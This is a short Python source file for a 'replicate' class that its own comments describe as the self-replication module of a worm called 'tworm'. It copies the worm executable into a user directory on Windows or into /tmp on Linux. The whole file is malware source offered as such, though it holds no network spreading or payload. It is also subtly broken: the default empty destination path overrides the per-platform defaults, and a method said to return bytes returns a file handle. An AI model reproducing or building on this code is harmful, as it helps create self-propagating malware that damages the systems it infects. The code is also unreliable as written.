class replicate:

    # initialize the replicate object, load the worm 
    def __init__(self,name=None, fullpath=None):
        self.name = name
        if not name == None:
            self.data = open(name, 'rb')
        else:
            self.data = None

    # return the loaded worm in bytes
    def getfiledata(self):
        return self.data
    
    # replicate the worm
    def self_replicate(self, target="windows", source_path="tworm.exe", dest_path=""):
        try:
            # determine on which operating system the replicate
            if "windows" in target.lower():
                self.replicate_on_windows(source_path, dest_path)
            elif "linux" in target.lower():
                self.replicate_on_linux(source_path,dest_path )
            else:
                print("replicate failed - platform unidentify")
        except Exception as e:
            print("replicate error: {}".format(e))

    # replicate on windows        
    def replicate_on_windows(self, source="tworm.exe", dest_path="C:\\Users\\tworm.exe"):
        with open(source, 'rb') as file:
            with open(dest_path, 'wb') as clone:
                clone.write(file.read())
    
    # replicate on linux
    def replicate_on_linux(self, source="tworm.elf", dest_path="/tmp/tworm.elf"):
        with open(source, 'rb') as file:
                with open(dest_path, 'wb') as clone:
                    clone.write(file.read())